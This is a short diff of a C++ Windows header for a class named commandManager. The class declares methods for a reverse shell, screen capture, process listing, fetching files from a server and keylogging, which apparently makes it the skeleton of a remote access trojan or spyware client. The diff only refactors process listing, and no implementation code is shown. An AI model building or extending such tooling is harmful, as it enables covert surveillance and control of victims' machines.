@@ -1,18 +1,19 @@
 #pragma once
 #include <string>
 #include <Windows.h>
+#include <map>
 
 
 class commandManager
 {
-//private:
-	
+private:
+	std::wstring pidToName(DWORD procID);
 
 public:
 	ULONG64 screen_len = 0;
 	commandManager();
 	std::string reverseShell(std::string cmd);
-	void getProcess();
+	std::map<DWORD, std::wstring> getProcessList();
 	LPVOID getScreen();
 	void getFile(std::string& path, LPCWSTR server);
 	void keyLogger();
